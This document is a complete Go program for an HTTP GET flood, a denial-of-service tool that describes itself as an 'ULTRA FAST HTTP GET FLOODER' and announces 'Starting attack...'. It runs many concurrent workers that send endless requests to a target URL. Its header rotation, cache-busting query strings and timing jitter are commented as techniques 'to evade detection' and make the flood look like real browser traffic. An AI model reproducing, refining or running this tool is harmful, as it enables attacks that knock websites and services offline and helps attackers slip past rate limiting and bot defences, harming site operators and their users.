package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Global statistics counters
var (
	successCount uint64
	failCount    uint64
	totalSent    uint64
)

// UserAgents for rotation to evade detection
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 Edg/91.0.864.71",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 OPR/78.0.4093.112",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
}

// Referers for rotation to evade detection
var referers = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://search.yahoo.com/",
	"https://www.facebook.com/",
	"https://twitter.com/",
	"https://www.reddit.com/",
	"https://www.linkedin.com/",
	"https://www.youtube.com/",
	"https://www.instagram.com/",
	"https://www.amazon.com/",
}

// AcceptHeaders for rotation to evade detection
var acceptHeaders = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
}

// AcceptLanguages for rotation to evade detection
var acceptLanguages = []string{
	"en-US,en;q=0.9",
	"en-GB,en;q=0.9",
	"en-CA,en;q=0.9",
	"en-AU,en;q=0.9",
	"fr-FR,fr;q=0.9,en;q=0.8",
	"de-DE,de;q=0.9,en;q=0.8",
	"es-ES,es;q=0.9,en;q=0.8",
	"it-IT,it;q=0.9,en;q=0.8",
	"ja-JP,ja;q=0.9,en;q=0.8",
	"zh-CN,zh;q=0.9,en;q=0.8",
}

// Random string generator for cache busting
func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

// Advanced HTTP client with evasion techniques
func createAdvancedClient(timeout time.Duration, keepAlive time.Duration, disableCompression bool, disableKeepAlives bool) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
			},
		},
		DisableKeepAlives:     disableKeepAlives,
		MaxIdleConns:          100,
		MaxIdleConnsPerHost:   100,
		MaxConnsPerHost:       0, // Unlimited
		IdleConnTimeout:       keepAlive,
		ResponseHeaderTimeout: timeout,
		ExpectContinueTimeout: 1 * time.Second,
		ForceAttemptHTTP2:     true,
		DisableCompression:    disableCompression,
	}

	return &http.Client{
		Timeout:   timeout,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Allow up to 10 redirects
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}
			// Update headers on redirect to maintain evasion
			req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
			req.Header.Set("Referer", referers[rand.Intn(len(referers))])
			return nil
		},
	}
}

// Prepare request with evasion techniques
func prepareRequest(targetURL string, method string, headers map[string]string, cookies map[string]string, cacheBuster bool) (*http.Request, error) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	// Add cache busting parameter if enabled
	if cacheBuster {
		q := parsedURL.Query()
		q.Add(randomString(8), randomString(16))
		parsedURL.RawQuery = q.Encode()
	}

	req, err := http.NewRequest(method, parsedURL.String(), nil)
	if err != nil {
		return nil, err
	}

	// Set random User-Agent
	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

	// Set random Referer
	req.Header.Set("Referer", referers[rand.Intn(len(referers))])

	// Set random Accept header
	req.Header.Set("Accept", acceptHeaders[rand.Intn(len(acceptHeaders))])

	// Set random Accept-Language header
	req.Header.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])

	// Set Connection header to appear more like a browser
	req.Header.Set("Connection", "keep-alive")

	// Set random DNT (Do Not Track) value
	if rand.Intn(2) == 0 {
		req.Header.Set("DNT", "1")
	}

	// Add custom headers
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	// Add cookies
	for name, value := range cookies {
		req.AddCookie(&http.Cookie{
			Name:  name,
			Value: value,
		})
	}

	return req, nil
}

// Worker function to send requests
func worker(id int, targetURL string, method string, headers map[string]string, cookies map[string]string, 
			timeout time.Duration, keepAlive time.Duration, disableCompression bool, disableKeepAlives bool, 
			cacheBuster bool, delay time.Duration, jitter int, wg *sync.WaitGroup) {
	defer wg.Done()

	// Create client with advanced settings
	client := createAdvancedClient(timeout, keepAlive, disableCompression, disableKeepAlives)

	// Local counters for this worker
	var localSuccess, localFail uint64

	for {
		// Prepare request with evasion techniques
		req, err := prepareRequest(targetURL, method, headers, cookies, cacheBuster)
		if err != nil {
			atomic.AddUint64(&failCount, 1)
			continue
		}

		// Send request
		resp, err := client.Do(req)

		if err != nil {
			atomic.AddUint64(&failCount, 1)
			localFail++
		} else {
			// Discard response body to free connections
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()

			atomic.AddUint64(&successCount, 1)
			localSuccess++

			// Adaptive behavior based on response
			if resp.StatusCode == 429 || resp.StatusCode == 503 {
				// If rate limited, back off slightly
				time.Sleep(time.Duration(rand.Intn(500)+500) * time.Millisecond)
			}
		}

		atomic.AddUint64(&totalSent, 1)

		// Apply delay with jitter to appear more like real traffic
		if delay > 0 {
			jitterMs := 0
			if jitter > 0 {
				jitterMs = rand.Intn(jitter)
			}
			time.Sleep(delay + time.Duration(jitterMs)*time.Millisecond)
		}
	}
}

// Display statistics in real-time
func statsReporter(interval time.Duration, startTime time.Time) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	var lastTotal uint64

	for range ticker.C {
		current := atomic.LoadUint64(&totalSent)
		success := atomic.LoadUint64(&successCount)
		fail := atomic.LoadUint64(&failCount)
		elapsed := time.Since(startTime).Seconds()
		rps := float64(current) / elapsed
		currentRps := float64(current-lastTotal) / interval.Seconds()
		lastTotal = current

		fmt.Printf("[STATUS] Requests: %d | Success: %d | Failed: %d | RPS: %.2f | Current RPS: %.2f | Uptime: %.1fs\n",
			current, success, fail, rps, currentRps, elapsed)
	}
}

func main() {
	// Seed the random number generator
	rand.Seed(time.Now().UnixNano())

	// Command line flags
	targetURL := flag.String("url", "", "Target URL (required)")
	workers := flag.Int("workers", runtime.NumCPU()*10, "Number of concurrent workers")
	timeoutMs := flag.Int("timeout", 5000, "Request timeout in milliseconds")
	keepAliveMs := flag.Int("keepalive", 30000, "Keep-alive timeout in milliseconds")
	method := flag.String("method", "GET", "HTTP method to use (GET, HEAD)")
	disableCompression := flag.Bool("no-compression", false, "Disable compression")
	disableKeepAlives := flag.Bool("no-keepalive", false, "Disable keep-alives")
	cacheBuster := flag.Bool("cache-buster", true, "Add random query parameters to bust cache")
	delayMs := flag.Int("delay", 0, "Delay between requests in milliseconds (per worker)")
	jitterMs := flag.Int("jitter", 0, "Random jitter added to delay in milliseconds")
	headersList := flag.String("headers", "", "Custom headers (format: 'Name1:Value1,Name2:Value2')")
	cookiesList := flag.String("cookies", "", "Cookies to send (format: 'Name1=Value1,Name2=Value2')")
	statsIntervalSec := flag.Int("stats-interval", 1, "Statistics display interval in seconds")

	flag.Parse()

	// Validate required parameters
	if *targetURL == "" {
		fmt.Println("Error: Target URL is required")
		flag.Usage()
		os.Exit(1)
	}

	// Parse custom headers
	headers := make(map[string]string)
	if *headersList != "" {
		for _, header := range strings.Split(*headersList, ",") {
			parts := strings.SplitN(header, ":", 2)
			if len(parts) == 2 {
				headers[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
			}
		}
	}

	// Parse cookies
	cookies := make(map[string]string)
	if *cookiesList != "" {
		for _, cookie := range strings.Split(*cookiesList, ",") {
			parts := strings.SplitN(cookie, "=", 2)
			if len(parts) == 2 {
				cookies[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
			}
		}
	}

	// Configure timeouts
	timeout := time.Duration(*timeoutMs) * time.Millisecond
	keepAlive := time.Duration(*keepAliveMs) * time.Millisecond
	delay := time.Duration(*delayMs) * time.Millisecond
	statsInterval := time.Duration(*statsIntervalSec) * time.Second

	// Print configuration
	fmt.Println("╔═════════════════════════════════════════════════════╗")
	fmt.Println("║             ULTRA FAST HTTP GET FLOODER            ║")
	fmt.Println("╚═════════════════════════════════════════════════════╝")
	fmt.Printf("Target URL: %s\n", *targetURL)
	fmt.Printf("Method: %s\n", *method)
	fmt.Printf("Workers: %d\n", *workers)
	fmt.Printf("Timeout: %v\n", timeout)
	fmt.Printf("Keep-Alive: %v\n", keepAlive)
	fmt.Printf("Compression disabled: %v\n", *disableCompression)
	fmt.Printf("Keep-Alives disabled: %v\n", *disableKeepAlives)
	fmt.Printf("Cache-Buster: %v\n", *cacheBuster)
	fmt.Printf("Delay: %v\n", delay)
	fmt.Printf("Jitter: %dms\n", *jitterMs)
	fmt.Println("Starting attack...")

	// Start time for statistics
	startTime := time.Now()

	// Start statistics reporter
	go statsReporter(statsInterval, startTime)

	// Start workers
	var wg sync.WaitGroup
	for i := 0; i < *workers; i++ {
		wg.Add(1)
		go worker(i, *targetURL, *method, headers, cookies, timeout, keepAlive, 
			*disableCompression, *disableKeepAlives, *cacheBuster, delay, *jitterMs, &wg)
	}

	// Wait for all workers to complete (which they never will unless interrupted)
	wg.Wait()
}
